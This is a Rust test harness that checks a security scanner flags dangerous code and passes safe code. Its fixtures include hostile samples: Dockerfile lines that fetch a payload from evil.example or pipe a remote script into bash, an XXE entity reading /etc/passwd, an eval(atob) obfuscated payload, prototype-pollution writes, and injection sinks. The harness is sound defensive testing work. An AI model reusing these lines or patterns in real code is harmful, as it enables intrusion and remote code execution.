//! # The Crucible — Threat Gallery Regression Harness
//!
//! Deterministic proof that every active security detector in `crates/forge`
//! correctly intercepts its target pattern AND does not fire on safe code.
//!
//! ## Usage
//!
//! ```bash
//! # Run the full gallery and print per-entry verdict
//! cargo run -p crucible
//!
//! # Run as part of the test suite (integrated into `just audit`)
//! cargo test -p crucible
//! ```
//!
//! ## Exit codes
//! - `0` — SANCTUARY INTACT: all threat entries intercepted, all safe entries passed
//! - `1` — BREACH DETECTED: one or more entries failed

use forge::slop_filter::{PRBouncer, PatchBouncer, SlopScore};
use forge::slop_hunter::{find_slop, ParsedUnit};

// ---------------------------------------------------------------------------
// Gallery entry type
// ---------------------------------------------------------------------------

/// A single entry in the Threat Gallery.
struct Entry {
    /// Human-readable name shown in output.
    name: &'static str,
    /// File extension (language tag) passed to `find_slop`.
    lang: &'static str,
    /// Source code fixture.
    source: &'static [u8],
    /// `true` → detector MUST fire; `false` → detector MUST be silent.
    must_intercept: bool,
    /// Optional substring that the finding description must contain.
    desc_fragment: Option<&'static str>,
}

// ---------------------------------------------------------------------------
// Threat Gallery — all active rules, one entry per distinct trigger path
// ---------------------------------------------------------------------------

const GALLERY: &[Entry] = &[
    // ── YAML: Kubernetes routing resources with wildcard host ─────────────
    Entry {
        name: "YAML/VirtualService wildcard host — INTERCEPT",
        lang: "yaml",
        source: b"\
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: bookinfo
spec:
  hosts:
  - \"*\"
  gateways:
  - bookinfo-gateway
",
        must_intercept: true,
        desc_fragment: Some("VirtualService"),
    },
    Entry {
        name: "YAML/Ingress wildcard host — INTERCEPT",
        lang: "yaml",
        source: b"\
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: test-ingress
spec:
  hosts:
  - \"*\"
",
        must_intercept: true,
        desc_fragment: Some("Ingress"),
    },
    Entry {
        name: "YAML/HTTPRoute wildcard host — INTERCEPT",
        lang: "yaml",
        source: b"\
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: test-route
spec:
  hosts:
  - \"*\"
",
        must_intercept: true,
        desc_fragment: Some("HTTPRoute"),
    },
    Entry {
        name: "YAML/Gateway wildcard host — INTERCEPT",
        lang: "yaml",
        source: b"\
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: test-gw
spec:
  hosts:
  - \"*\"
",
        must_intercept: true,
        desc_fragment: Some("Gateway"),
    },
    Entry {
        name: "YAML/VirtualService specific host — SAFE",
        lang: "yaml",
        source: b"\
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: bookinfo
spec:
  hosts:
  - bookinfo.example.com
",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "YAML/non-routing kind — SAFE",
        lang: "yaml",
        source: b"\
apiVersion: v1
kind: ConfigMap
metadata:
  name: config
data:
  key: value
",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── C: banned libc functions ──────────────────────────────────────────
    Entry {
        name: "C/gets() call — INTERCEPT",
        lang: "c",
        source: b"#include <stdio.h>\nint main() { char buf[64]; gets(buf); return 0; }\n",
        must_intercept: true,
        desc_fragment: Some("gets()"),
    },
    Entry {
        name: "C/strcpy() call — INTERCEPT",
        lang: "c",
        source: b"#include <string.h>\nvoid f(char *d, const char *s) { strcpy(d, s); }\n",
        must_intercept: true,
        desc_fragment: Some("strcpy()"),
    },
    Entry {
        name: "C/sprintf() call — INTERCEPT",
        lang: "c",
        source: b"#include <stdio.h>\nvoid f(char *buf, const char *in) { sprintf(buf, \"%s\", in); }\n",
        must_intercept: true,
        desc_fragment: Some("sprintf()"),
    },
    Entry {
        name: "C/scanf() call — INTERCEPT",
        lang: "c",
        source: b"#include <stdio.h>\nvoid f() { char buf[64]; scanf(\"%s\", buf); }\n",
        must_intercept: true,
        desc_fragment: Some("scanf()"),
    },
    Entry {
        name: "C/fgets() safe alternative — SAFE",
        lang: "c",
        source: b"#include <stdio.h>\nint main() { char buf[64]; fgets(buf, sizeof(buf), stdin); return 0; }\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── C++: same banned functions via C grammar reuse ───────────────────
    Entry {
        name: "C++/gets() call — INTERCEPT",
        lang: "cpp",
        source: b"#include <cstdio>\nvoid f() { char buf[64]; gets(buf); }\n",
        must_intercept: true,
        desc_fragment: Some("gets()"),
    },
    Entry {
        name: "C++/strcpy() call — INTERCEPT",
        lang: "cpp",
        source: b"#include <cstring>\nvoid f(char *d, const char *s) { strcpy(d, s); }\n",
        must_intercept: true,
        desc_fragment: Some("strcpy()"),
    },
    Entry {
        name: "C++/sprintf() call — INTERCEPT",
        lang: "cpp",
        source: b"#include <cstdio>\nvoid f(char *buf, const char *in) { sprintf(buf, \"%s\", in); }\n",
        must_intercept: true,
        desc_fragment: Some("sprintf()"),
    },
    Entry {
        name: "C++/scanf() call — INTERCEPT",
        lang: "cpp",
        source: b"#include <cstdio>\nvoid f() { char buf[64]; scanf(\"%s\", buf); }\n",
        must_intercept: true,
        desc_fragment: Some("scanf()"),
    },
    Entry {
        name: "C++/safe string ops — SAFE",
        lang: "cpp",
        source: b"#include <cstring>\nvoid f(char *d, size_t n, const char *s) { strncpy(d, s, n - 1); d[n-1] = '\\0'; }\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "C/system(dynamic) — INTERCEPT",
        lang: "c",
        source: b"#include <stdlib.h>\nvoid f(char *cmd) { system(cmd); }\n",
        must_intercept: true,
        desc_fragment: Some("os_command_injection"),
    },
    Entry {
        name: "C/system(literal) — SAFE",
        lang: "c",
        source: b"#include <stdlib.h>\nvoid f() { system(\"/usr/bin/id\"); }\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Dockerfile remote fetch ────────────────────────────────────────────
    Entry {
        name: "Dockerfile/remote ADD — INTERCEPT",
        lang: "dockerfile",
        source: b"FROM alpine:3.20\nADD https://evil.example/payload.tgz /opt/payload.tgz\n",
        must_intercept: true,
        desc_fragment: Some("docker_remote_add"),
    },
    Entry {
        name: "Dockerfile/RUN pipe bash — INTERCEPT",
        lang: "dockerfile",
        source: b"FROM alpine:3.20\nRUN curl -fsSL https://evil.example/install.sh | bash\n",
        must_intercept: true,
        desc_fragment: Some("dockerfile_pipe_execution"),
    },
    Entry {
        name: "Dockerfile/local COPY — SAFE",
        lang: "dockerfile",
        source: b"FROM alpine:3.20\nCOPY ./payload.tgz /opt/payload.tgz\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Dockerfile/RUN literal package install — SAFE",
        lang: "dockerfile",
        source: b"FROM alpine:3.20\nRUN apk add --no-cache curl\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── XML XXE ────────────────────────────────────────────────────────────
    Entry {
        name: "XML/external entity SYSTEM — INTERCEPT",
        lang: "xml",
        source: br#"<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
"#,
        must_intercept: true,
        desc_fragment: Some("xxe_external_entity"),
    },
    Entry {
        name: "XML/plain document — SAFE",
        lang: "xml",
        source: br#"<?xml version="1.0"?><foo>safe</foo>"#,
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Proto type erasure ────────────────────────────────────────────────
    Entry {
        name: "Proto/google.protobuf.Any — INTERCEPT",
        lang: "proto",
        source: b"syntax = \"proto3\";\nimport \"google/protobuf/any.proto\";\nmessage Envelope { google.protobuf.Any payload = 1; }\n",
        must_intercept: true,
        desc_fragment: Some("protobuf_any_type_field"),
    },
    Entry {
        name: "Proto/typed message field — SAFE",
        lang: "proto",
        source: b"syntax = \"proto3\";\nmessage Payload { string value = 1; }\nmessage Envelope { Payload payload = 1; }\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Bazel/Starlark unpinned remote fetch ──────────────────────────────
    Entry {
        name: "Starlark/http_archive without sha256 — INTERCEPT",
        lang: "bzl",
        source: b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n)\n",
        must_intercept: true,
        desc_fragment: Some("bazel_unverified_http_archive"),
    },
    Entry {
        name: "Starlark/http_archive pinned — SAFE",
        lang: "bzl",
        source: b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n    sha256 = \"abc123\",\n)\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── CMake command interpolation ───────────────────────────────────────
    Entry {
        name: "CMake/execute_process variable command — INTERCEPT",
        lang: "cmake",
        source: b"set(USER_CMD ${ENV{PAYLOAD}})\nexecute_process(COMMAND ${USER_CMD} OUTPUT_VARIABLE out)\n",
        must_intercept: true,
        desc_fragment: Some("cmake_execute_process_injection"),
    },
    Entry {
        name: "CMake/execute_process literal command — SAFE",
        lang: "cmake",
        source: b"execute_process(COMMAND /usr/bin/git rev-parse HEAD OUTPUT_VARIABLE out)\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── HCL/Terraform ────────────────────────────────────────────────────
    Entry {
        name: "HCL/open CIDR 0.0.0.0/0 — INTERCEPT",
        lang: "tf",
        source: b"\
resource \"aws_security_group_rule\" \"ingress_all\" {
  type        = \"ingress\"
  cidr_blocks = [\"0.0.0.0/0\"]
  from_port   = 0
  to_port     = 65535
  protocol    = \"-1\"
}
",
        must_intercept: true,
        desc_fragment: Some("CIDR"),
    },
    Entry {
        name: "HCL/S3 public-read ACL — INTERCEPT",
        lang: "tf",
        source: b"\
resource \"aws_s3_bucket_acl\" \"public\" {
  bucket = aws_s3_bucket.data.id
  acl    = \"public-read\"
}
",
        must_intercept: true,
        desc_fragment: Some("public"),
    },
    Entry {
        name: "HCL/restricted CIDR — SAFE",
        lang: "tf",
        source: b"\
resource \"aws_security_group_rule\" \"ingress_office\" {
  type        = \"ingress\"
  cidr_blocks = [\"10.0.0.0/8\"]
  from_port   = 443
  to_port     = 443
  protocol    = \"tcp\"
}
",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "HCL/S3 private ACL — SAFE",
        lang: "tf",
        source: b"\
resource \"aws_s3_bucket_acl\" \"private\" {
  bucket = aws_s3_bucket.data.id
  acl    = \"private\"
}
",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Python ───────────────────────────────────────────────────────────
    Entry {
        name: "Python/subprocess shell=True — INTERCEPT",
        lang: "py",
        source: b"import subprocess\nsubprocess.run(cmd, shell=True)\n",
        must_intercept: true,
        desc_fragment: Some("shell=True"),
    },
    Entry {
        name: "Python/subprocess without shell=True — SAFE",
        lang: "py",
        source: b"import subprocess\nsubprocess.run([\"ls\", \"-la\"])\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Python/shell=True without subprocess — SAFE",
        lang: "py",
        source: b"config = {\"shell\": True, \"debug\": False}\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Credential Leak — Secret Interception ─────────────────────────────
    // Uses find_slop("rs", &ParsedUnit::unparsed(source)) because the
    // credential scan runs on ALL
    // languages via find_credential_slop() called from find_slop().
    Entry {
        name: "Rust/AWS IAM key prefix — INTERCEPT",
        lang: "rs",
        source: b"const AWS_KEY: &str = \"AKIAIOSFODNN7EXAMPLE\";",
        must_intercept: true,
        desc_fragment: Some("credential_leak"),
    },
    Entry {
        name: "Rust/RSA private key PEM header — INTERCEPT",
        lang: "rs",
        source: b"let pem = \"-----BEGIN RSA PRIVATE KEY-----\";",
        must_intercept: true,
        desc_fragment: Some("RSA private key"),
    },
    Entry {
        name: "Rust/Stripe live key prefix — INTERCEPT",
        lang: "rs",
        // Minimal fixture: only the prefix is needed to trigger the detector.
        // No realistic suffix to avoid triggering repository push-protection.
        source: b"const KEY: &str = \"sk_live_\";",
        must_intercept: true,
        desc_fragment: Some("credential_leak"),
    },
    Entry {
        name: "Rust/clean string constant — SAFE",
        lang: "rs",
        source: b"const APP_NAME: &str = \"prod-service-v2\";",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── JavaScript / TypeScript ───────────────────────────────────────────
    Entry {
        name: "JS/innerHTML assignment — INTERCEPT",
        lang: "js",
        source: b"function render(el, data) { el.innerHTML = data; }\n",
        must_intercept: true,
        desc_fragment: Some("innerHTML"),
    },
    Entry {
        name: "TS/innerHTML assignment — INTERCEPT",
        lang: "ts",
        source: b"function render(el: HTMLElement, data: string): void { el.innerHTML = data; }\n",
        must_intercept: true,
        desc_fragment: Some("innerHTML"),
    },
    Entry {
        name: "JS/textContent — SAFE",
        lang: "js",
        source: b"function render(el, data) { el.textContent = data; }\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "JS/dead branch payload — INTERCEPT",
        lang: "js",
        source: b"if (false) { const blob = \"Qz9Lm4Nk8Vh2Yr7Pw1Sd6Tf0Ua3Xe8Bj5Kp9Rv2Cm7Hs8Wq4Zd1Jn6Mx0Kb3Yt5P\"; }\n",
        must_intercept: true,
        desc_fragment: Some("phantom_payload_evasion"),
    },
    Entry {
        name: "JS/dead branch debug code — SAFE",
        lang: "js",
        source: b"if (false) { console.log(\"debug\"); }\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "JS/eval atob payload — INTERCEPT",
        lang: "js",
        source: b"eval(atob(\"Y29uc29sZS5sb2coJ2hhY2tlZCcp\"));\n",
        must_intercept: true,
        desc_fragment: Some("obfuscated_payload_execution"),
    },
    Entry {
        name: "JS/eval fragmented base64 concat — INTERCEPT",
        lang: "js",
        source: b"eval((\"Y29uc2\" + \"9sZS5\" + \"sb2co\" + \"J2hhY2tlZCcp\"));\n",
        must_intercept: true,
        desc_fragment: Some("obfuscated_payload_execution"),
    },

    // ── Supply Chain Integrity ────────────────────────────────────────────
    Entry {
        name: "HTML/external script without SRI — INTERCEPT",
        lang: "html",
        source: b"<script src=\"https://cdn.example.com/analytics.js\"></script>",
        must_intercept: true,
        desc_fragment: Some("unpinned_asset"),
    },
    Entry {
        name: "HTML/github.io CDN URL — INTERCEPT",
        lang: "html",
        source: b"const lib = \"https://some-org.github.io/dist/lib.js\";",
        must_intercept: true,
        desc_fragment: Some("unpinned_asset"),
    },
    Entry {
        name: "HTML/relative script path — SAFE",
        lang: "html",
        source: b"<script src=\"/assets/app.js\" type=\"module\"></script>",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "JS/github.com URL (not github.io) — SAFE",
        lang: "js",
        source: b"const REPO = \"https://github.com/owner/repo/releases\";",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── CISA KEV Gates ──────────────────────────────────────────────────────
    Entry {
        name: "KEV/Python SQLi concatenation — INTERCEPT",
        lang: "py",
        source: b"cursor.execute(\"SELECT * FROM users WHERE id=\" + user_id)",
        must_intercept: true,
        desc_fragment: Some("sqli_concatenation"),
    },
    Entry {
        name: "KEV/Python SQLi parameterized — CLEAN",
        lang: "py",
        source: b"cursor.execute(\"SELECT * FROM users WHERE id=?\", (user_id,))",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "KEV/Go SQLi concatenation — INTERCEPT",
        lang: "go",
        source: b"rows, _ := db.Query(\"SELECT * FROM users WHERE id=\" + userId)",
        must_intercept: true,
        desc_fragment: Some("sqli_concatenation"),
    },
    Entry {
        name: "KEV/Go SQLi parameterized — CLEAN",
        lang: "go",
        source: b"rows, _ := db.Query(\"SELECT * FROM users WHERE id=$1\", userId)",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "KEV/Python SSRF dynamic URL — INTERCEPT",
        lang: "py",
        source: b"response = requests.get(\"https://internal.corp/\" + user_input)",
        must_intercept: true,
        desc_fragment: Some("ssrf_dynamic_url"),
    },
    Entry {
        name: "KEV/Python SSRF static URL — CLEAN",
        lang: "py",
        source: b"response = requests.get(\"https://api.example.com/users/123\")",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "KEV/JS SSRF dynamic fetch — INTERCEPT",
        lang: "js",
        source: b"const resp = await fetch(\"https://api.example.com/\" + userId);",
        must_intercept: true,
        desc_fragment: Some("ssrf_dynamic_url"),
    },
    Entry {
        name: "KEV/JS SSRF static fetch — CLEAN",
        lang: "js",
        source: b"const resp = await fetch(\"https://api.example.com/users/123\");",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "KEV/Python path traversal concatenation — INTERCEPT",
        lang: "py",
        source: b"with open(base_dir + user_file, 'r') as f:\n    content = f.read()\n",
        must_intercept: true,
        desc_fragment: Some("path_traversal_concatenation"),
    },
    Entry {
        name: "KEV/Python path traversal os.path.join — CLEAN",
        lang: "py",
        source: b"import os\nwith open(os.path.join(base_dir, user_file), 'r') as f:\n    content = f.read()\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "KEV/JS path traversal readFile concatenation — INTERCEPT",
        lang: "js",
        source: b"fs.readFile(uploadDir + filename, 'utf8', callback);",
        must_intercept: true,
        desc_fragment: Some("path_traversal_concatenation"),
    },
    Entry {
        name: "KEV/JS path traversal path.join — CLEAN",
        lang: "js",
        source: b"const p = path.join(uploadDir, filename);\nfs.readFile(p, 'utf8', callback);",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 1 R&D: Java Deserialization Gadget Chains ──────────────────────
    Entry {
        name: "Java/ObjectInputStream gadget chain — INTERCEPT",
        lang: "java",
        source: b"ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());\nObject obj = ois.readObject();\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "Java/Runtime.getRuntime().exec() shell injection — INTERCEPT",
        lang: "java",
        source: b"Process p = Runtime.getRuntime().exec(userInput);\n",
        must_intercept: true,
        desc_fragment: Some("runtime_exec"),
    },
    Entry {
        name: "Java/InitialContext JNDI injection — INTERCEPT",
        lang: "java",
        source: b"Object obj = new InitialContext().lookup(userInput);\n",
        must_intercept: true,
        desc_fragment: Some("jndi_injection"),
    },
    Entry {
        name: "Java/clean Serializable class — SAFE",
        lang: "java",
        source: b"public class Config implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String name;\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 1 R&D: C# Deserialization (Newtonsoft.Json + BinaryFormatter) ──
    Entry {
        name: "C#/BinaryFormatter instantiation — INTERCEPT",
        lang: "cs",
        source: b"var formatter = new BinaryFormatter();\nformatter.Serialize(stream, obj);\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "C#/TypeNameHandling.Auto — INTERCEPT",
        lang: "cs",
        source: b"var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto };\nvar obj = JsonConvert.DeserializeObject(json, settings);\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "C#/TypeNameHandling.None safe setting — SAFE",
        lang: "cs",
        source: b"var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None };\nvar obj = JsonConvert.DeserializeObject<MyType>(json, settings);\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "C#/clean System.Text.Json deserialization — SAFE",
        lang: "cs",
        source: b"var obj = System.Text.Json.JsonSerializer.Deserialize<MyType>(json);\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 1 R&D: Prototype Pollution (JavaScript / TypeScript) ───────────
    Entry {
        name: "JS/.__proto__ direct access — INTERCEPT",
        lang: "js",
        source: b"function merge(target, src) {\n    for (const key in src) {\n        target[key] = src[key];\n    }\n}\nconst payload = JSON.parse(userInput);\nmerge(target, payload);\ntarget.__proto__.isAdmin = true;\n",
        must_intercept: true,
        desc_fragment: Some("prototype_pollution"),
    },
    Entry {
        name: "JS/[\"__proto__\"] bracket access — INTERCEPT",
        lang: "js",
        source: b"obj[\"__proto__\"][\"admin\"] = true;\n",
        must_intercept: true,
        desc_fragment: Some("prototype_pollution"),
    },
    Entry {
        name: "JS/[constructor][prototype] chain — INTERCEPT",
        lang: "js",
        source: b"obj[constructor][prototype].polluted = true;\n",
        must_intercept: true,
        desc_fragment: Some("prototype_pollution"),
    },
    Entry {
        name: "JS/Object.freeze prototype defense — SAFE",
        lang: "js",
        source: b"Object.freeze(Object.prototype);\nconst safe = Object.create(null);\nsafe.key = value;\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 2 R&D: Python Dangerous-Call AST Walk ───────────────────────────
    Entry {
        name: "Python/exec() code execution — INTERCEPT",
        lang: "py",
        source: b"exec(user_input)\n",
        must_intercept: true,
        desc_fragment: Some("code_execution"),
    },
    Entry {
        name: "Python/eval() dynamic eval in production — INTERCEPT",
        lang: "py",
        source: b"result = eval(expression)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_eval"),
    },
    Entry {
        name: "Python/eval() inside test_ function — SAFE (suppressed)",
        lang: "py",
        source: b"def test_eval_behavior():\n    result = eval('1 + 2')\n    assert result == 3\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Python/pickle.loads() unsafe deserialization — INTERCEPT",
        lang: "py",
        source: b"import pickle\nobj = pickle.loads(data)\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "Python/os.system() command injection — INTERCEPT",
        lang: "py",
        source: b"import os\nos.system(cmd)\n",
        must_intercept: true,
        desc_fragment: Some("os_command_injection"),
    },
    Entry {
        name: "Python/__import__() dynamic import — INTERCEPT",
        lang: "py",
        source: b"mod = __import__(module_name)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_import"),
    },
    Entry {
        name: "Python/ast.literal_eval safe alternative — SAFE",
        lang: "py",
        source: b"import ast\nresult = ast.literal_eval(user_input)\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 2 R&D: Java Method-Invocation AST Walk ─────────────────────────
    Entry {
        name: "Java/ObjectInputStream.readObject() deserialization — INTERCEPT",
        lang: "java",
        source: b"ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());\nObject obj = ois.readObject();\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "Java/Runtime.getRuntime().exec() shell injection — INTERCEPT",
        lang: "java",
        source: b"Process p = Runtime.getRuntime().exec(userInput);\n",
        must_intercept: true,
        desc_fragment: Some("runtime_exec"),
    },
    Entry {
        name: "Java/InitialContext.lookup() dynamic JNDI — INTERCEPT",
        lang: "java",
        source: b"InitialContext ctx = new InitialContext();\nObject obj = ctx.lookup(userInput);\n",
        must_intercept: true,
        desc_fragment: Some("jndi_injection"),
    },
    Entry {
        name: "Java/InitialContext.lookup(\"static\") — SAFE (static string arg)",
        lang: "java",
        source: b"InitialContext ctx = new InitialContext();\nDataSource ds = (DataSource) ctx.lookup(\"java:comp/env/jdbc/mydb\");\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Java/clean JSON deserialization — SAFE",
        lang: "java",
        source: b"ObjectMapper mapper = new ObjectMapper();\nMyClass obj = mapper.readValue(json, MyClass.class);\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Java-2b: ProcessBuilder command injection (AST walk) ─────────────────
    Entry {
        name: "Java/ProcessBuilder dynamic arg — INTERCEPT (Java-2b)",
        lang: "java",
        source: b"ProcessBuilder pb = new ProcessBuilder(userCommand);\npb.start();\n",
        must_intercept: true,
        desc_fragment: Some("process_builder_injection"),
    },
    Entry {
        name: "Java/ProcessBuilder literal args — SAFE (Java-2b TN)",
        lang: "java",
        source: b"ProcessBuilder pb = new ProcessBuilder(\"git\", \"status\");\npb.start();\n",
        must_intercept: false,
        desc_fragment: Some("process_builder_injection"),
    },

    // ── Java-3: XXE DocumentBuilderFactory (hybrid AST + byte check) ─────────
    Entry {
        name: "Java/DocumentBuilderFactory without XXE hardening — INTERCEPT (Java-3)",
        lang: "java",
        source: b"DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();\nDocument doc = builder.parse(inputStream);\n",
        must_intercept: true,
        desc_fragment: Some("xxe_documentbuilder"),
    },
    Entry {
        name: "Java/DocumentBuilderFactory with disallow-doctype-decl — SAFE (Java-3 TN)",
        lang: "java",
        source: b"DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nDocumentBuilder builder = factory.newDocumentBuilder();\n",
        must_intercept: false,
        desc_fragment: Some("xxe_documentbuilder"),
    },

    // ── Java RCE Hardening: WebLogic T3/IIOP + XMLDecoder ────────────────────
    Entry {
        name: "Java/ctx.resolve(dynamic) WebLogic IIOP — INTERCEPT",
        lang: "java",
        source: b"InitialContext ctx = new InitialContext();\nObject obj = ctx.resolve(userInput);\n",
        must_intercept: true,
        desc_fragment: Some("jndi_injection"),
    },
    Entry {
        name: "Java/ctx.resolve(string_literal) — SAFE",
        lang: "java",
        source: b"InitialContext ctx = new InitialContext();\nObject obj = ctx.resolve(\"java:comp/env/jdbc/ds\");\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Java/new XMLDecoder(stream) — INTERCEPT (WebLogic/F5 vector)",
        lang: "java",
        source: b"XMLDecoder decoder = new XMLDecoder(inputStream);\nObject obj = decoder.readObject();\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },

    // ── Phase 3 R&D: C# AST Walk (TypeNameHandling + BinaryFormatter) ────────
    Entry {
        name: "C#/TypeNameHandling.Objects AST assignment — INTERCEPT",
        lang: "cs",
        source: b"settings.TypeNameHandling = TypeNameHandling.Objects;\nvar obj = JsonConvert.DeserializeObject(json, settings);\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "C#/TypeNameHandling.All AST assignment — INTERCEPT",
        lang: "cs",
        source: b"var s = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "C#/TypeNameHandling.None only — SAFE (AST TN)",
        lang: "cs",
        source: b"var s = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None, NullValueHandling = NullValueHandling.Ignore };\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 3 R&D: Prototype Pollution Layer B (JS merge sink AST walk) ─────
    Entry {
        name: "JS/_.merge with JSON.parse arg — INTERCEPT (PP Layer B)",
        lang: "js",
        source: b"_.merge(config, JSON.parse(req.rawBody));\n",
        must_intercept: true,
        desc_fragment: Some("prototype_pollution_merge_sink"),
    },
    Entry {
        name: "JS/Object.assign with req.body — INTERCEPT (PP Layer B)",
        lang: "js",
        source: b"Object.assign(defaultSettings, req.body);\n",
        must_intercept: true,
        desc_fragment: Some("prototype_pollution_merge_sink"),
    },
    Entry {
        name: "JS/_.merge inside sanitize function — SAFE (PP Layer B TN)",
        lang: "js",
        source: b"function sanitizeAndApply(target) {\n    _.merge(target, req.body);\n    return target;\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "JS/_.merge with literal object — SAFE (PP Layer B TN)",
        lang: "js",
        source: b"_.merge(defaults, { theme: 'dark', locale: 'en' });\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 4 R&D: Go AST Walk ─────────────────────────────────────────────
    Entry {
        name: "Go/exec.Command shell injection — INTERCEPT",
        lang: "go",
        source: b"cmd := exec.Command(\"bash\", \"-c\", userInput)\ncmd.Run()\n",
        must_intercept: true,
        desc_fragment: Some("security:command_injection_shell_exec"),
    },
    Entry {
        name: "Go/exec.Command non-shell — SAFE",
        lang: "go",
        source: b"cmd := exec.Command(\"git\", \"status\")\ncmd.Run()\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Go/InsecureSkipVerify true — INTERCEPT",
        lang: "go",
        source: b"tr := &http.Transport{\n    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n}\n",
        must_intercept: true,
        desc_fragment: Some("security:tls_verification_bypass"),
    },
    Entry {
        name: "Go/InsecureSkipVerify false — SAFE",
        lang: "go",
        source: b"tr := &http.Transport{\n    TLSClientConfig: &tls.Config{InsecureSkipVerify: false},\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Go-3: SQL injection concatenation ────────────────────────────────────
    Entry {
        name: "Go/db.Query dynamic concat — INTERCEPT (Go-3)",
        lang: "go",
        source: b"rows, _ := db.Query(\"SELECT * FROM users WHERE id = \" + userID)\n",
        must_intercept: true,
        desc_fragment: Some("security:sql_injection_concatenation"),
    },
    Entry {
        name: "Go/db.Query parameterized — SAFE (Go-3 TN)",
        lang: "go",
        source: b"rows, _ := db.Query(\"SELECT * FROM users WHERE id = ?\", userID)\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 4 R&D: Ruby AST Walk ───────────────────────────────────────────
    Entry {
        name: "Ruby/eval dynamic arg — INTERCEPT",
        lang: "rb",
        source: b"eval(params[:code])\n",
        must_intercept: true,
        desc_fragment: Some("security:dangerous_execution"),
    },
    Entry {
        name: "Ruby/eval string literal — SAFE",
        lang: "rb",
        source: b"eval(\"1 + 1\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Ruby/Marshal.load user data — INTERCEPT",
        lang: "rb",
        source: b"obj = Marshal.load(user_data)\n",
        must_intercept: true,
        desc_fragment: Some("security:unsafe_deserialization"),
    },
    Entry {
        name: "Ruby/Marshal.dump safe serialization — SAFE",
        lang: "rb",
        source: b"data = Marshal.dump(object)\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Ruby/ActiveRecord where interpolation — INTERCEPT",
        lang: "rb",
        source: b"def fetch_user(user_id)\n  User.where(\"id = #{user_id}\")\nend\n",
